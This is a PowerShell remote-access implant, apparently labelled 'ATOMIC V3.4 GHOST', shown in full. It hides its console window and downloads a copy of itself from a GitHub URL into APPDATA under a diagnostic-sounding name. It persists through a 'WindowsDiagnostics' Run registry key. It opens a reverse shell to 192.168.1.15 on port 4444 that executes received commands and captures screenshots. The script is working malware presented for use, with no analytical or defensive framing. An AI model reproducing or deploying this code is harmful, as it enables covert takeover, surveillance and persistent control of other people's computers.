# --- CONFIG ---
$ip = '192.168.1.15'
$port = 4444
$url = 'https://raw.githubusercontent.com/B15cu1t/shell.ps1/main/shell_v2.ps1'
$installPath = "$env:APPDATA\win_diag.ps1"

# --- 1. THE "NO-CRASH" WRAPPER ---
while($true) {
    try {
        # --- 2. INSTANT SILENCE ---
        # We put this in a try block because Add-Type often fails on boot
        try {
            $code = '[DllImport("user32.dll")] public static extern bool ShowWindow(IntPtr hWnd, int nCmdShow);'
            $win = Add-Type -MemberDefinition $code -Name "Win32" -Namespace "Util$([Guid]::NewGuid().ToString().Replace('-',''))" -PassThru
            $hwnd = (Get-Process -Id $PID).MainWindowHandle
            if ($hwnd -ne 0) { [void]$win::ShowWindow($hwnd, 0) }
        } catch { } 

        # --- 3. WAIT FOR NETWORK ---
        # Loop until we can reach your IP or Google
        while (!(Test-Connection -ComputerName 8.8.8.8 -Count 1 -ErrorAction SilentlyContinue)) {
            Start-Sleep -Seconds 5
        }

        # --- 4. PERSISTENCE REPAIR ---
        if (!(Test-Path $installPath)) {
            (New-Object Net.WebClient).DownloadFile($url, $installPath)
        }
        $key = "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run"
        $val = "powershell.exe -WindowStyle Hidden -nop -w hidden -f `"$installPath`""
        if ((Get-ItemProperty $key -ErrorAction SilentlyContinue).WindowsDiagnostics -ne $val) {
            Set-ItemProperty -Path $key -Name "WindowsDiagnostics" -Value $val
        }

        # --- 5. THE CONNECTION ---
        $c = New-Object System.Net.Sockets.TCPClient($ip, $port)
        $s = $c.GetStream(); $r = New-Object System.IO.StreamReader($s); $w = New-Object System.IO.StreamWriter($s)
        $w.AutoFlush = $true
        $w.WriteLine("--- ATOMIC V3.4 GHOST ONLINE: $env:COMPUTERNAME ---")

        while($c.Connected) {
            $w.Write("PS " + (Get-Location).Path + "> ")
            $line = $r.ReadLine()
            if ($null -eq $line -or $line -eq "exit") { break }

            if ($line.Trim() -eq "screenshot") {
                Add-Type -AssemblyName System.Windows.Forms, System.Drawing
                $screen = [System.Windows.Forms.Screen]::PrimaryScreen.Bounds
                $bmp = New-Object System.Drawing.Bitmap($screen.Width, $screen.Height)
                $g = [System.Drawing.Graphics]::FromImage($bmp)
                $g.CopyFromScreen($screen.Location, [System.Drawing.Point]::Empty, $screen.Size)
                $ms = New-Object System.IO.MemoryStream
                $bmp.Save($ms, [System.Drawing.Imaging.ImageFormat]::Jpeg)
                $w.WriteLine([Convert]::ToBase64String($ms.ToArray()))
                $g.Dispose(); $bmp.Dispose(); $ms.Dispose()
            } 
            else {
                $out = try { iex $line 2>&1 | Out-String } catch { $_.Exception.Message }
                $w.WriteLine($out)
            }
        }
    } catch { 
        # If ANYTHING fails (No internet, No listener, Syntax error), wait 20s and restart the whole logic
        Start-Sleep -Seconds 20 
    } finally {
        if ($null -ne $c) { $c.Close() }
    }
}
